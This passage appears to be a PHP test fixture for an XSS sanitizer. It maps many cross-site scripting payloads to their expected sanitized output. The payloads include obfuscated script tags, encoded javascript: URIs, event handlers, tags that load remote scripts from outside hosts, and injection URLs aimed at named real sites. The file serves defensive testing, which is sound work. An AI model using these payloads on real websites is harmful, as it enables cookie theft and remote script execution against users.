            '<XSS STYLE="behavior: url(xss.htc);">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '<XSS >', // Local htc file
            '¼script¾alert(¢XSS¢)¼/script¾'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '', // US-ASCII encoding
            "<IMG defang_SRC=javascript:alert\(&quot;XSS&quot;\)>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => '<IMG >', // IMG
            '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '<IMG >',
            '<img src =x onerror=confirm(document.cookie);>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<img >',
            "<IMG SRC=\"jav	ascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '<IMG SRC="(\'XSS\');">',
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '<IMG SRC="(\'XSS\');">',
            "<IMG SRC=\"jav&#x09;ascript:alert&rpar;'XSS'&rpar;;\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '<IMG SRC=")\'XSS\');">',
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '<IMG SRC="(\'XSS\');">',
            '<test lall=&amp;amp;#039;jav&#x0A;ascript:alert(\\&amp;amp;#039;XSS\\&amp;amp;#039;);&amp;amp;#039;>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => "<test lall='(\'XSS\');'>",
            "<IMG SRC\n=\n\"\nj\na\nv\n&#x0A;a\ns\nc\nr\ni\np\nt\n:\na\nl\ne\nr\nt\n(\n'\nX\nS\nS\n'\n)\n;\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             => "<IMG SRC\n=\n\"\n(\n'\nX\nS\nS\n'\n)\n;\">",
            "<IMG SRC=java�script:alert('XSS')>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '<IMG >',
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028\\0027\\0058\\0053\\0053\\0027\\0029'\\0029\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '<DIV >',
            "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '&lt;STYLE&gt;.XSS{background-image:url("(\'XSS\')");}&lt;/STYLE&gt;<A ></A>',
            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=(\'XSS\');"&gt;', // META
            "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '&lt;IFRAME SRC="(\'XSS\');"&gt;&lt;/IFRAME&gt;', // IFRAME
            '<applet code=A21 width=256 height=256 archive="toir.jar"></applet>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '&lt;applet code=A21 width=256 height=256 archive="toir.jar"&gt;&lt;/applet&gt;',
            '<applet code="javascript:confirm(document.cookie);">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => '&lt;applet code="();"&gt;',
            '<script Language="JavaScript" event="FSCommand (command, args)" for="theMovie">...</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '...', // <script>
            '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => 'PT >', // XSS using HTML quote encapsulation
            '<SCR�IPT>alert("XSS")</SCR�IPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '',
            "Би шил идэй чадна,<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>我能吞下玻璃而不傷身體</br>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => 'Би шил идэй чадна,&lt;STYLE&gt;li {list-style-image: url("(\'XSS\')");}&lt;/STYLE&gt;<UL><LI>我能吞下玻璃而不傷身體</br>',
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"\; alert(String.fromCharCode(88,83,83))//\"\;alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '\';alert&#40;String.fromCharCode(88,83,83&#41;)//\';alert&#40;String.fromCharCode(88,83,83&#41;)//"\; alert&#40;String.fromCharCode(88,83,83&#41;)//"\;alert&#40;String.fromCharCode(88,83,83&#41;)//-->">\'>',
            'म काँच खान सक्छू र मलाई केहि नी हुन्‍न् <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>।'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => 'म काँच खान सक्छू र मलाई केहि नी हुन्न् <IMG >।',
            "https://[host]/testing?foo=bar&tab=<script>alert('foobar')</script>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => 'https://[host]/testing?foo=bar&tab=',
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_qty=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_qty='\">", // XSS to attack "pfSense" - https://www.htbridge.com/advisory/HTB23251
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_protocolflags=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_protocolflags='\">",
            'https://[host]/diag_logs_filter.php?filterlogentries_submit=1&filterlogentries_s ourceport=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => "https://[host]/diag_logs_filter.php?filterlogentries_submit=1&filterlogentries_s ourceport='\">",
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_destinationport=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_destinationport='\">",
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_destinationipaddress=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3 E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_destinationipaddress='\">",
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_sourceport=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_sourceport='\">",
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_sourceipaddress=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_sourceipaddress='\">",
            'https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_time=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             => "https://[host]/diag_logs_filter.phpfilterlogentries_submit=1&filterlogentries_time='\">",
            "http://www.amazon.com/review/R3FSGZJ3NBYZM/?id=brute'-alert('XSSPOSED' )-'logic"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => "http://www.amazon.com/review/R3FSGZJ3NBYZM/?id=brute'-alert&#40;'XSSPOSED' &#41;-'logic", // XSS from amazon -> https://www.xssposed.org/search/?search=amazon.com&type=host&
            "User-Agent: </script><svg/onload=alert('xssposed')>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => 'User-Agent: &lt;svg/&gt;',
            "https://www.amazon.com/gp/aw/ya/181-1583093-7256013/\"></form><script>a lert('Lohit Tummalapenta')</script>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => 'https://www.amazon.com/gp/aw/ya/181-1583093-7256013/">&lt;/form&gt;',
            "https://aws.amazon.com/amis?ami_provider_id=4&amp;architecture='\"--></ style></script><script>alert(0x015E00)</script>&amp;selection=ami_prov ider_id+architecture"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => 'https://aws.amazon.com/amis?ami_provider_id=4&architecture=\'"-->&lt;/ style&gt;&selection=ami_prov ider_id+architecture',
            'pipe=ssrProductAds&amp;step=2&amp;userName=1211&amp;replyTo=test%40xssed.com&amp;subjectEscape=&amp;subject=Unable+to+re gister+for+Product+Ads&amp;emailMessageEscape=&amp;emailMessage=&amp;displayName=%27%22%3E%3Ciframe+src%3Dhttp:% 2F%2Fxssed.com%3E&amp;companyURL=&amp;address1=&amp;address2=&amp;city=&amp;state=&amp;zipCode=&amp;country=United+States&amp;ccCard holderName=&amp;ccIssuer=V&amp;addCreditCardNumber=&amp;ccExpMonth=10&amp;ccExpYear=2010&amp;businessAddressCheck=useBus inessAddress&amp;billingAddress1=&amp;billingAddress2=&amp;billingCity=&amp;billingState=&amp;billingZipCode=&amp;billingCou ntry=United+States&amp;Continue=&amp;_pi_legalName=121&amp;_pi_tokenID=A1F3841M9ZHMMV&amp;_pi_pipe=ssrProductAds&amp;_pi _email=kf%40xssed.com&amp;_pi_step=1&amp;_pi_areaCode=112&amp;_pi_phone1=121&amp;_pi_userName=1211&amp;_pi_ext=211221212 1&amp;_pi_phone2=1221' => "pipe=ssrProductAds&step=2&userName=1211&replyTo=test@xssed.com&subjectEscape=&subject=Unable+to+re gister+for+Product+Ads&emailMessageEscape=&emailMessage=&displayName='\">&lt;iframe+src=http:% 2F/xssed.com&gt;&companyURL=&address1=&address2=&city=&state=&zipCode=&country=United+States&ccCard holderName=&ccIssuer=V&addCreditCardNumber=&ccExpMonth=10&ccExpYear=2010&businessAddressCheck=useBus inessAddress&billingAddress1=&billingAddress2=&billingCity=&billingState=&billingZipCode=&billingCou ntry=United+States&Continue=&_pi_legalName=121&_pi_tokenID=A1F3841M9ZHMMV&_pi_pipe=ssrProductAds&_pi _email=kf@xssed.com&_pi_step=1&_pi_areaCode=112&_pi_phone1=121&_pi_userName=1211&_pi_ext=211221212 1&_pi_phone2=1221",
            'http://www.amazon.com/s?ie=UTF5&amp;keywords="><script>alert(document. cookie)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => 'http://www.amazon.com/s?ie=UTF5&keywords=">',
            'http://www.amazon.com/gp/digital/rich-media/media-player.html?ie=UTF8& amp;location=javascript:alert(1)&amp;ASIN=B000083JTS'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => 'http://www.amazon.com/gp/digital/rich-media/media-player.html?ie=UTF8& amp;location=(1)&ASIN=B000083JTS',
            'http://r-images.amazon.com/s7ondemand/brochure/flash_brochure.jsp?comp any=ama1&sku=AtHome7&windowtitle=XSS&lt;/title&gt;&lt;plaintext&gt;'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => 'http://r-images.amazon.com/s7ondemand/brochure/flash_brochure.jsp?comp any=ama1&sku=AtHome7&windowtitle=XSS&lt;/title&gt;&lt;plaintext&gt;',
            "http://www.amazon.com/s/ref=amb_link_7189562_72/002-2069697-5560831?ie =UTF8&amp;node=&quot;/&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;&a mp;pct-off=25-&amp;hidden-keywords=athletic|outdoor&amp;pf_rd_m=ATVPDK IKX0DER&amp;pf_rd_s=center-5&amp;pf_r"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => 'http://www.amazon.com/s/ref=amb_link_7189562_72/002-2069697-5560831?ie =UTF8&node="/>&a mp;pct-off=25-&hidden-keywords=athletic|outdoor&pf_rd_m=ATVPDK IKX0DER&pf_rd_s=center-5&pf_r',
            'https://sellercentral.amazon.com/gp/on-board/workflow/Registration/log in.html?passthrough/&amp;passthrough/account=soa"><script>alert("XSS") </script>&amp;passthrough/superSource=OAR&amp;passthrough/marketplaceI D=ATVPDKI'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => 'https://sellercentral.amazon.com/gp/on-board/workflow/Registration/log in.html?passthrough/&passthrough/account=soa">&passthrough/superSource=OAR&passthrough/marketplaceI D=ATVPDKI',
            'http://sellercentral.amazon.com/gp/seller/product-ads/registration.htm l?ld="><script>alert(document.cookie)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => 'http://sellercentral.amazon.com/gp/seller/product-ads/registration.htm l?ld=">',
            'https://sellercentral.amazon.com/gp/change-password/-"><script>alert(d ocument.cookie)</script>-.html'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => 'https://sellercentral.amazon.com/gp/change-password/-">-.html',
            'http://www.amazon.com/s/ref=sr_a9ps_home/?url=search-alias=aps&amp;tag =amzna9-1-20&amp;field-keywords=-"><script>alert(document.cookie)</scr ipt>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => 'http://www.amazon.com/s/ref=sr_a9ps_home/?url=search-alias=aps&tag =amzna9-1-20&field-keywords=-">',
            'http://www.amazon.com/s/ref=amb_link_7581132_5/102-9803838-3100108?ie= UTF8&amp;node=&quot;/&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/scr ipt&gt;&amp;keywords=Lips&amp;emi=A19ZEOAOKUUP0Q&amp;pf_rd_m=ATVPDKIKX 0DER&amp;pf_rd_s=left-1&amp;pf_rd_r=1JMP7'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => 'http://www.amazon.com/s/ref=amb_link_7581132_5/102-9803838-3100108?ie= UTF8&node="/>&keywords=Lips&emi=A19ZEOAOKUUP0Q&pf_rd_m=ATVPDKIKX 0DER&pf_rd_s=left-1&pf_rd_r=1JMP7',
            "http://askville.amazon.com/SearchRequests.do?search=\"></script><script >alert('XSS')</script>&amp;start=0&amp;max=10&amp;open=true&amp;closed =true&amp;x=18&amp;y=7"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => 'http://askville.amazon.com/SearchRequests.do?search=">&start=0&max=10&open=true&closed =true&x=18&y=7',
            'https://sellercentral.amazon.com/gp/seller/registration/login.html?ie= UTF8&amp;email=&amp;errors=<script src=http://ha.ckers.org/xss.js?/>&amp;userName=&amp;tokenID=AO9UIQIH15 TE'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => 'https://sellercentral.amazon.com/gp/seller/registration/login.html?ie= UTF8&email=&errors=&userName=&tokenID=AO9UIQIH15 TE',
            'https://sellercentral.amazon.com/gp/seller/registration/login.html?ie= UTF8&amp;email=<script src=http://ha.ckers.org/xss.js?/>&amp;userName=&amp;tokenID=AO9UIQIH15 TE'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => 'https://sellercentral.amazon.com/gp/seller/registration/login.html?ie= UTF8&email=&userName=&tokenID=AO9UIQIH15 TE',
            'address-daytime-phone=&amp;address-daytime-phone-areacode=%24Q%24%2F%3E&amp;address-daytime-phone-ext=&amp;pipel ine-return-directly=1&amp;pipeline-return-handler=fx-pay-pages%2Fmanage-pay-pages%2F&amp;pipeline-return-han dler-type=post&amp;pipeline-return-html=fx%2Fhelp%2Fgetting-started.html&amp;pipeline-type=payee&amp;register-bi lling-address-id=jgmhpujplj&amp;register-credit-card-id=A1V46DGTZUE15I&amp;register-enter-checking-info=no&amp;r egister-epay-registration-status-check=no&amp;register-nickname=pg5of16&amp;register-payment-program=tipping &amp;input-address-daytime-phone-areacode=%22%2F%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3F %2F%3E&amp;input-address-daytime-phone=&amp;input-address-daytime-phone-ext=&amp;input-register-nickname=xss&amp;inp ut-register-enter-checking-info=no&amp;x=0&amp;y=0'                                                => 'address-daytime-phone=&address-daytime-phone-areacode=$Q$/>&address-daytime-phone-ext=&pipel ine-return-directly=1&pipeline-return-handler=fx-pay-pages/manage-pay-pages/&pipeline-return-han dler-type=post&pipeline-return-html=fx/help/getting-started.html&pipeline-type=payee&register-bi lling-address-id=jgmhpujplj&register-credit-card-id=A1V46DGTZUE15I&register-enter-checking-info=no&r egister-epay-registration-status-check=no&register-nickname=pg5of16&register-payment-program=tipping &input-address-daytime-phone-areacode="/>&input-address-daytime-phone=&input-address-daytime-phone-ext=&input-register-nickname=xss&inp ut-register-enter-checking-info=no&x=0&y=0',
            'c=A2H6YBKBHMURHR&amp;t=1&amp;o=4&amp;process_form=1&amp;email_address=%22%2F%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers .org%2Fxss.js%3F%2F%3E&amp;password=&amp;x=0&amp;y=0'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => 'c=A2H6YBKBHMURHR&t=1&o=4&process_form=1&email_address="/>&password=&x=0&y=0',
            "https://affiliate-program.amazon.com/gp/associates/help/glossary/'>\">< SCRIPT/SRC=http://kusomiso.com/xss.js></SCRIPT>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => "https://affiliate-program.amazon.com/gp/associates/help/glossary/'>\">",
            "https://affiliate-program.amazon.com/gp/associates/help/main.html/'>\"> <SCRIPT/SRC=http://kusomiso.com/xss.js></SCRIPT>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => "https://affiliate-program.amazon.com/gp/associates/help/main.html/'>\"> ",
            "http://www.amazon.com/gp/daily/ref=\"/><script>alert('XSS $4.99 S&amp;H')</script>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => 'http://www.amazon.com/gp/daily/ref="/>',
            'http://bilderdienst.bundestag.de/archives/btgpict/search/_%27-document.write%28String.fromCharCode%2860,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,98,108,111,103,46,102,100,105,107,46,111,114,103,47,50,48,49,51,45,48,54,47,51,56,56,57,50,49,56,55,46,106,112,103,34,32,115,116,121,108,101,61,34,112,97,100,100,105,110,103,58,32,50,53,48,112,120,32,51,51,48,112,120,59,10,112,111,115,105,116,105,111,110,58,32,97,98,115,111,108,117,116,101,59,10,122,45,105,110,100,101,120,58,32,49,48,59,34,62%29%29-%27/'                                                                                                                                                                                                                                                                                                                                                                         => "http://bilderdienst.bundestag.de/archives/btgpict/search/_'-(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,98,108,111,103,46,102,100,105,107,46,111,114,103,47,50,48,49,51,45,48,54,47,51,56,56,57,50,49,56,55,46,106,112,103,34,32,115,116,121,108,101,61,34,112,97,100,100,105,110,103,58,32,50,53,48,112,120,32,51,51,48,112,120,59,10,112,111,115,105,116,105,111,110,58,32,97,98,115,111,108,117,116,101,59,10,122,45,105,110,100,101,120,58,32,49,48,59,34,62))-'/",
            'https://bilderdienst.bundestag.de/archives/btgpict/search/_%27-dOcumEnt.wRite%28String.fromCharCode%2860,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,98,108,111,103,46,102,100,105,107,46,111,114,103,47,50,48,49,51,45,48,54,47,51,56,56,57,50,49,56,55,46,106,112,103,34,32,115,116,121,108,101,61,34,112,97,100,100,105,110,103,58,32,50,53,48,112,120,32,51,51,48,112,120,59,10,112,111,115,105,116,105,111,110,58,32,97,98,115,111,108,117,116,101,59,10,122,45,105,110,100,101,120,58,32,49,48,59,34,62%29%29-%27/'                                                                                                                                                                                                                                                                                                                                                                        => "https://bilderdienst.bundestag.de/archives/btgpict/search/_'-(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,98,108,111,103,46,102,100,105,107,46,111,114,103,47,50,48,49,51,45,48,54,47,51,56,56,57,50,49,56,55,46,106,112,103,34,32,115,116,121,108,101,61,34,112,97,100,100,105,110,103,58,32,50,53,48,112,120,32,51,51,48,112,120,59,10,112,111,115,105,116,105,111,110,58,32,97,98,115,111,108,117,116,101,59,10,122,45,105,110,100,101,120,58,32,49,48,59,34,62))-'/",
            '<img src=x:alert(alt) onerror=eval(src) alt=0>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<img >',
            '<IMG SRC="j a' . \chr(0) . 'v a ' . "\xe2\x82\xa1" . ' ｓ c ｒ' . "\xf0\x90\x8c\xbc" . 'ｉ ｐ t:alert(\'XSS\');">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '<IMG src="">',
            '<IMG alt="中文空白" SRC="j a v a ' . "\xe2\x82\xa1" . ' ｓ c ｒ' . "\xf0\x90\x8c\xbc" . 'ｉ ｐ t:alert(\'XSS\');">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '<IMG alt="中文空白" src="">',
            '<script>prompt(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '',
            '<script>confirm(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '',
            '<script>var fn=window[490837..toString(1<<5)];fn(atob(\'YWxlcnQoMSk=\'));</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '',
            '<script>var fn=window[String.fromCharCode(101,118,97,108)];fn(atob(\'YWxlcnQoMSk=\'));</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '',
            '<script>var fn=window[atob(\'ZXZhbA==\')];fn(atob(\'YWxlcnQoMSk=\'));</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '',
            '<script>window[490837..toString(1<<5)](atob(\'YWxlcnQoMSk=\'))</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '',
            '<script>this[490837..toString(1<<5)](atob(\'YWxlcnQoMSk=\'))</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '',
            '<script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => '',
            '<script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '',
            '<script>\'str1ng\'.replace(/1/,alert)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '',
            '<script>\'bbbalert(1)cccc\'.replace(/a\w{4}\(\d\)/,eval)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => '',
            '<script>\'a1l2e3r4t6\'.replace(/(.).(.).(.).(.).(.)/, function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '',
            '<script>eval(\'\\\\u\'+\'0061\'+\'lert(1)\')</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '',
            '<script>throw~delete~typeof~prompt(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '',
            '<script>delete[a=alert]/prompt a(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '',
            '<script>delete[a=this[atob(\'YWxlcnQ=\')]]/prompt a(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '',
            '<script>(()=>{return this})().alert(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '',
            '<script>new function(){new.target.constructor(\'alert(1)\')();}</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '',
            '<script>Reflect.construct(function(){new.target.constructor(\'alert(1)\')()},[])</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => '',
            '<link/rel=prefetch&#10import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => "&lt;link/rel=prefetch\nimport href=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&gt;",
            '<link rel="import" href="data:x,<script>alert(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => '&lt;link rel="import" href="data:x,',
            '<script>Array.from`1${alert}3${window}2`</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => '',
            '<script>!{x(){alert(1)}}.x()</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '',
            '<script>Array.from`${eval}alert\`1\``</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '',
            '<script>Array.from([1],alert)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '',
            '<script>Promise.reject("1").then(null,alert)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '',
            '<svg </onload ="1> (_=alert,_(1)) "">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;svg &lt;/"&gt;',
            '<img onerror="location=\'javascript:=lert(1)\'" src="x">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '<img  src="x">',
            '<img onerror="location=\'javascript:%61lert(1)\'" src="x">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '<img  src="x">',
            '<img onerror="location=\'javascript:\x2561lert(1)\'" src="x">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '<img  src="x">',
            '<img onerror="location=\'javascript:\x255Cu0061lert(1)\'" src="x" >'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => '<img  src="x" >',
